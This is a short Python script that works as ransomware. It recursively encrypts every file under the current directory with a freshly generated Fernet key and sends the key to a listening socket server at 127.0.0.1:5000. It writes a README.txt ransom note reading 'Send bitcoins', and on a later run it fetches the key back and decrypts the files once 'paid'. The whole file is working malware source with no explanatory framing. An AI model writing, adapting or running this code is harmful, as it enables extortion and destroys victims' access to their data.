import socket
import os
from cryptography.fernet import Fernet

def update_path(operation, path=os.getcwd()):
    dirs = list(filter(os.path.isdir, os.listdir(path)))
    files = list(filter(os.path.isfile, os.listdir(path)))

    if path == os.getcwd():
        files.remove(os.path.basename(__file__))

        if 'README.txt' in files:
            files.remove('README.txt')


    for file in files:
        update_file(operation, path+'\\'+file)

    for d in dirs:
        update_path(operation, path+'\\'+d)


def update_file(operation, filename):
    with open(filename) as f:  			
        file_content = f.read()

    updated = operation(file_content.encode())

    with open(filename, 'w') as f:
        f.write(updated.decode())


skt = socket.socket()
addr = ('127.0.0.1', 5000)
skt.connect(addr)

if 'README.txt' not in os.listdir():
    key = Fernet.generate_key()
    fernet = Fernet(key)
    update_path(fernet.encrypt)

    skt.send('[KEY]'.encode()+key)

    with open('README.txt', 'w') as f:
        f.write("Send bitcoins")
else:
    skt.send('[DECODE]'.encode())
    key = skt.recv(1024)
    fernet = Fernet(key)
    update_path(fernet.decrypt)

    with open('README.txt', 'w') as f:
        f.write("Thanks for your donation sir")

skt.close()
